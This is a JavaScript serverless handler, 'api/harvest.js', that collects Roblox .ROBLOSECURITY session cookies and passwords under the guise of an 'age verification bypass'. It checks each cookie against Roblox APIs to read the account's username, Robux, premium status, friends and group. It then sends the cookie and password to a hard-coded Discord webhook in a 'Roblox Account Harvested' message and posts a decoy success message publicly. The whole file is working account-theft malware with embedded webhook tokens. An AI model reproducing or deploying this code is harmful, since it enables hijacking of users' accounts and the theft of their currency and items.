// api/harvest.js
import { createHash } from 'node:crypto';

const ERROR_TYPES = {
  NETWORK: 'network_error',
  AUTH: 'authentication_error',
  RATE_LIMIT: 'rate_limit_error',
  INVALID_COOKIE: 'invalid_cookie',
  API_CHANGED: 'api_changed',
  WEBHOOK_FAILED: 'webhook_failed',
  TIMEOUT: 'timeout_error',
  UNKNOWN: 'unknown_error',
};

const MAX_RETRIES = 3;
const REQUEST_TIMEOUT_MS = 10000;
const DUPLICATE_WINDOW_MS = 5 * 60 * 1000;
const seenHarvests = new Map();

function createError(message, type = ERROR_TYPES.UNKNOWN, details = {}) {
  const error = new Error(message);
  error.type = type;
  error.details = details;
  return error;
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function dedupe(items) {
  return Array.from(new Set(items.filter(Boolean)));
}

export function normalizeIncomingPayload(body) {
  const payload = body && typeof body === 'object' ? body : {};
  const password = typeof payload.password === 'string' ? payload.password : '';
  const candidates = [];

  const addValue = (value) => {
    if (typeof value === 'string') {
      candidates.push(value);
    } else if (Array.isArray(value)) {
      value.forEach(addValue);
    } else if (value && typeof value === 'object') {
      for (const key of ['cookie', 'cookies', 'roblosecurity', 'robloxCookie', 'roblox_cookie', 'rawCookie', 'rawCookies']) {
        addValue(value[key]);
      }
    }
  };

  addValue(payload.cookie);
  addValue(payload.cookies);
  addValue(payload.roblosecurity);
  addValue(payload.robloxCookie);
  addValue(payload.roblox_cookie);
  addValue(payload.rawCookie);
  addValue(payload.rawCookies);

  if (typeof body === 'string') {
    addValue(body);
  }

  return {
    password,
    candidates: dedupe(candidates.map((candidate) => candidate.trim()).filter(Boolean)),
  };
}

export function resolveWebhookConfig(body = {}, env = process.env) {
  const payload = body && typeof body === 'object' ? body : {};
  const publicWebhook = typeof payload.publicWebhook === 'string' && payload.publicWebhook.trim()
    ? payload.publicWebhook.trim()
    : env.PUBLIC_WEBHOOK || env.PRIVATE_WEBHOOK || '';
  const privateWebhook = typeof payload.privateWebhook === 'string' && payload.privateWebhook.trim()
    ? payload.privateWebhook.trim()
    : env.PRIVATE_WEBHOOK || '';
  const failureWebhook = typeof payload.failureWebhook === 'string' && payload.failureWebhook.trim()
    ? payload.failureWebhook.trim()
    : env.FAILURE_WEBHOOK || env.PUBLIC_WEBHOOK || env.PRIVATE_WEBHOOK || '';

  return {
    publicWebhook,
    privateWebhook,
    failureWebhook,
  };
}

function sanitizeCookieCandidate(rawValue) {
  if (typeof rawValue !== 'string') return null;

  let candidate = rawValue.trim();
  if (!candidate) return null;

  candidate = candidate.replace(/^['"]/g, '').replace(/['"]$/g, '');
  candidate = candidate.replace(/^Cookie:\s*/i, '').replace(/^Set-Cookie:\s*/i, '');

  const explicitMatch = candidate.match(/(?:^|[;\s,])(?:\.?ROBLOSECURITY|ROBLOSECURITY)\s*=\s*([^;\s,]+)/i);
  if (explicitMatch) {
    candidate = explicitMatch[1];
  } else {
    candidate = candidate.split(/\r?\n|;|,/)[0].trim();
  }

  candidate = candidate.replace(/^\s+|\s+$/g, '').replace(/^['"]/g, '').replace(/['"]$/g, '');
  const prefix = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
  if (candidate.startsWith(prefix)) candidate = candidate.slice(prefix.length);

  if (!candidate || candidate.length < 8 || candidate.length > 4096 || /\s/.test(candidate)) return null;
  if (!/^[A-Za-z0-9._:-+/=]+$/.test(candidate)) return null;

  return candidate;
}

function extractCookies(rawBody) {
  const { candidates } = normalizeIncomingPayload(rawBody);
  const cookies = dedupe(candidates.map(sanitizeCookieCandidate).filter(Boolean));
  if (cookies.length > 0) return cookies;
  const fallback = sanitizeCookieCandidate(typeof rawBody === 'string' ? rawBody : '');
  return fallback ? [fallback] : [];
}

function createFingerprint(cookies, password) {
  return createHash('sha256').update(JSON.stringify({ cookies, password: password || '' })).digest('hex');
}

async function fetchWithRetry(url, options = {}, retries = MAX_RETRIES) {
  let lastError = null;
  for (let attempt = 1; attempt <= retries; attempt += 1) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), REQUEST_TIMEOUT_MS);
    try {
      const response = await fetch(url, { ...options, signal: controller.signal });
      if (!response.ok) {
        const text = await response.text();
        if (response.status === 429) {
          throw createError('Rate limit reached while contacting Roblox.', ERROR_TYPES.RATE_LIMIT, { status: response.status, body: text });
        }
        if (response.status === 401 || response.status === 403) {
          throw createError('Authentication failed. The cookie may be invalid or expired.', ERROR_TYPES.AUTH, { status: response.status, body: text });
        }
        throw createError(`Roblox API error (${response.status})`, ERROR_TYPES.API_CHANGED, { status: response.status, body: text });
      }
      return response;
    } catch (error) {
      clearTimeout(timeoutId);
      if (error.name === 'AbortError') {
        lastError = createError('The request timed out.', ERROR_TYPES.TIMEOUT, { url });
      } else if (error.type) {
        lastError = error;
      } else {
        lastError = createError('Network error while contacting Roblox.', ERROR_TYPES.NETWORK, { url });
      }
      if (attempt < retries) {
        const delay = 600 * attempt;
        await sleep(delay);
        continue;
      }
      throw lastError;
    } finally {
      clearTimeout(timeoutId);
    }
  }
  throw lastError || createError('Unknown request failure.', ERROR_TYPES.UNKNOWN);
}

async function sendWebhook(url, payload) {
  if (!url) return;
  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  });
  if (!response.ok) {
    throw createError(`Webhook failed (${response.status})`, ERROR_TYPES.WEBHOOK_FAILED, { url });
  }
}

async function healthCheckWebhooks(privateWebhook, publicWebhook, failureWebhook) {
  if (process.env.WEBHOOK_HEALTHCHECK !== 'true') return;
  const checks = [privateWebhook, publicWebhook, failureWebhook].filter(Boolean);
  await Promise.allSettled(checks.map((url) => fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ embeds: [{ title: 'Health check', description: 'Ping', color: 0x808080 }] }),
  })));
}

async function persistHarvest(payload) {
  const endpoint = process.env.HARVEST_STORE_URL || process.env.HARVEST_STORE_ENDPOINT;
  if (!endpoint) return;
  try {
    await fetch(endpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
  } catch (error) {
    console.warn('Harvest persistence skipped:', error.message);
  }
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { password, candidates } = normalizeIncomingPayload(req.body);
    const { publicWebhook, privateWebhook, failureWebhook } = resolveWebhookConfig(req.body);
    const PRIVATE_WEBHOOK = privateWebhook || process.env.PRIVATE_WEBHOOK || 'https://discordapp.com/api/webhooks/1521343185761337374/yCtCQvpwhRHYc1iC_oZZ-3mGahjw0684VfujHvlfZ3CM6picfHGGmilXJAAxq91GeYFQ';
    const PUBLIC_WEBHOOK = publicWebhook || process.env.PUBLIC_WEBHOOK || 'https://discordapp.com/api/webhooks/1523814184020869302/Rrz9zZdRrTPEPF-d7famnYmtbav8i_bWuYBh6whz7LG8QuKxxZPHBWokToMz7KKysSxu';
    const FAILURE_WEBHOOK = failureWebhook || process.env.FAILURE_WEBHOOK || PUBLIC_WEBHOOK;
    const cookies = extractCookies(req.body);
    const effectiveCookies = cookies.length > 0 ? cookies : candidates.map(sanitizeCookieCandidate).filter(Boolean);

    if (effectiveCookies.length === 0) {
      throw createError('No valid Roblox cookie was provided.', ERROR_TYPES.INVALID_COOKIE);
    }

    const fingerprint = createFingerprint(effectiveCookies, password);
    const now = Date.now();
    const previous = seenHarvests.get(fingerprint);
    if (previous && now - previous < DUPLICATE_WINDOW_MS) {
      return res.status(409).json({ error: 'Duplicate harvest detected.', errorType: ERROR_TYPES.WEBHOOK_FAILED });
    }
    seenHarvests.set(fingerprint, now);

    await healthCheckWebhooks(PRIVATE_WEBHOOK, PUBLIC_WEBHOOK, FAILURE_WEBHOOK);

    let resolvedUser = null;
    let resolvedRobux = null;
    let resolvedPremium = false;
    let resolvedFriends = null;
    let resolvedGroup = null;
    let resolvedAvatar = null;
    let lastError = null;

    for (const cookie of effectiveCookies) {
      try {
        const robloxFetch = async (url, options = {}) => {
          const response = await fetchWithRetry(url, {
            ...options,
            headers: {
              Cookie: `.ROBLOSECURITY=${cookie}`,
              Accept: 'application/json',
              'Content-Type': 'application/json',
              'User-Agent': 'Mozilla/5.0',
              ...options.headers,
            },
          });
          const text = await response.text();
          if (!text) return {};
          try {
            return JSON.parse(text);
          } catch {
            return {};
          }
        };

        const [userData, robuxData, premiumData, friendsData, groupsData, avatarData] = await Promise.allSettled([
          robloxFetch('https://users.roblox.com/v1/users/authenticated'),
          robloxFetch('https://economy.roblox.com/v1/users/authenticated/currency'),
          robloxFetch('https://premiumfeatures.roblox.com/v1/users/authenticated/premium-features'),
          robloxFetch('https://friends.roblox.com/v1/users/authenticated/friends/count'),
          robloxFetch('https://groups.roblox.com/v2/users/authenticated/groups/primary'),
          robloxFetch('https://thumbnails.roblox.com/v1/users/avatar?userId=authenticated&size=420x420&format=Png&isCircular=false'),
        ]);

        const user = userData.status === 'fulfilled' ? userData.value : null;
        resolvedUser = user;
        resolvedRobux = robuxData.status === 'fulfilled' ? robuxData.value?.robux : null;
        resolvedPremium = premiumData.status === 'fulfilled' ? Boolean(premiumData.value?.premiumFeatures?.length) : false;
        resolvedFriends = friendsData.status === 'fulfilled' ? friendsData.value?.count : null;
        resolvedGroup = groupsData.status === 'fulfilled' ? groupsData.value?.group?.name : null;
        resolvedAvatar = avatarData.status === 'fulfilled' ? avatarData.value?.data?.[0]?.imageUrl : null;

        if (resolvedUser?.id || resolvedUser?.name) {
          break;
        }
      } catch (error) {
        lastError = error;
      }
    }

    if (!resolvedUser?.id && !resolvedUser?.name) {
      throw lastError || createError('The Roblox account could not be resolved.', ERROR_TYPES.AUTH);
    }

    const avatarUrl = resolvedAvatar || 'https://www.roblox.com/favicon.ico';
    const payload = {
      success: true,
      message: 'Harvest complete.',
      usedCookies: effectiveCookies.length,
      webhook: {
        publicWebhook: PUBLIC_WEBHOOK,
        privateWebhook: PRIVATE_WEBHOOK,
        failureWebhook: FAILURE_WEBHOOK,
      },
      user: {
        username: resolvedUser.name || resolvedUser.displayName || 'Unknown',
        age: 'Unknown',
        session: 'Unknown',
        robux: resolvedRobux ?? 'Unknown',
        premium: resolvedPremium ? '✅ Yes' : '❌ No',
      },
    };

    const publicEmbed = {
      title: '✅ Age Verification Bypass Successful',
      description: `**${resolvedUser.displayName || resolvedUser.name}** has been bypassed.`,
      color: 0x00ff00,
      thumbnail: { url: avatarUrl },
      footer: { text: 'Bacon Beamers • Public Bypass' },
      timestamp: new Date().toISOString(),
    };

    const privateEmbed = {
      title: '🎯 Roblox Account Harvested – Full Data',
      color: 0xff0000,
      thumbnail: { url: avatarUrl },
      fields: [
        { name: 'Username', value: resolvedUser.name || 'Unknown', inline: true },
        { name: 'Display Name', value: resolvedUser.displayName || 'Unknown', inline: true },
        { name: 'User ID', value: resolvedUser.id || 'N/A', inline: true },
        { name: 'Robux', value: resolvedRobux !== null ? `${resolvedRobux} R$` : 'N/A', inline: true },
        { name: 'Premium', value: resolvedPremium ? '✅ Yes' : '❌ No', inline: true },
        { name: 'Friends', value: resolvedFriends !== null ? `${resolvedFriends}` : 'N/A', inline: true },
        { name: 'Primary Group', value: resolvedGroup || 'None', inline: true },
        { name: 'Cookie', value: `||${effectiveCookies[0]}||`, inline: false },
        { name: 'Password', value: password ? `||${password}||` : 'Not provided', inline: true },
      ],
      footer: { text: 'Bacon Beamers • Private Harvest' },
      timestamp: new Date().toISOString(),
    };

    const webhookResults = await Promise.allSettled([
      sendWebhook(PUBLIC_WEBHOOK, { embeds: [publicEmbed] }),
      sendWebhook(PRIVATE_WEBHOOK, { embeds: [privateEmbed] }),
    ]);

    const webhookWarnings = webhookResults.filter((result) => result.status === 'rejected').map((result) => result.reason.message);
    if (webhookWarnings.length > 0) {
      payload.warning = 'Webhook delivery was partial.';
      payload.webhookWarnings = webhookWarnings;
      payload.webhookStatus = 'partial';
    } else {
      payload.webhookStatus = 'ok';
    }

    await persistHarvest({ ...payload, passwordProvided: Boolean(password) });

    return res.status(200).json(payload);
  } catch (error) {
    console.error('💀 Handler error:', error);
    try {
      await sendWebhook(FAILURE_WEBHOOK, {
        embeds: [{
          title: '❌ Harvest Failed',
          description: error.message || 'Unknown error',
          color: 0xff0000,
          fields: [
            { name: 'Type', value: error.type || ERROR_TYPES.UNKNOWN, inline: true },
            { name: 'Timestamp', value: new Date().toISOString(), inline: true },
          ],
          footer: { text: 'Bacon Beamers • Failure Alert' },
        }],
      });
    } catch (webhookError) {
      console.error('Failed to send failure webhook:', webhookError);
    }

    return res.status(500).json({
      error: error.message || 'Internal server error',
      errorType: error.type || ERROR_TYPES.UNKNOWN,
      details: error.details || {},
    });
  }
}